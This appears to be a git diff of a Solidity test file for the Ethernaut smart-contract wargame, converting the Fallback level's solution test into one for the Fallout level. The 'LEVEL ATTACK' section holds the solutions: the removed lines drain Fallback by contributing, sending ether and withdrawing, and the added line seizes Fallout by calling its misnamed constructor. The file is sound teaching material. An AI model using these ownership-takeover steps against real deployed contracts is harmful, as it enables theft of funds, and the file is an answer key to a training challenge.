@@ -1,42 +1,36 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.6;
 
 import "ds-test/test.sol";
 import "forge-std/Vm.sol";
 
-import "src/core/Ethernaut.sol";
-import "src/levels/01-Fallback/FallbackFactory.sol";
+import "src/core/Ethernaut-06.sol";
+import "src/levels/02-Fallout/FalloutFactory.sol";
 
-contract FallbackTest is DSTest {
+contract FalloutTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
     address hacker = vm.addr(1); // generate random-looking address with given private key
 
     function setUp() public {
         ethernaut = new Ethernaut();
-
-        // set hacker's balance to 1 Ether, use it when you need!
-        vm.deal(hacker, 1 ether);
     }
 
-    function testFallbackHack() public {
+    function testFallout() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
-        FallbackFactory fallbackFactory = new FallbackFactory();
-        ethernaut.registerLevel(fallbackFactory);
+        FalloutFactory FalloutFactory = new FalloutFactory();
+        ethernaut.registerLevel(FalloutFactory);
         vm.startPrank(hacker);
-        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance(FalloutFactory);
+        Fallout ethernautFallout = Fallout(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
         // implement your solution here
-
-        ethernautFallback.contribute{value: 1}();
-        payable(levelAddress).call{value: 1}("");
-        ethernautFallback.withdraw();
+        ethernautFallout.Fal1out();
 
         //////////////////////
         // LEVEL SUBMISSION //
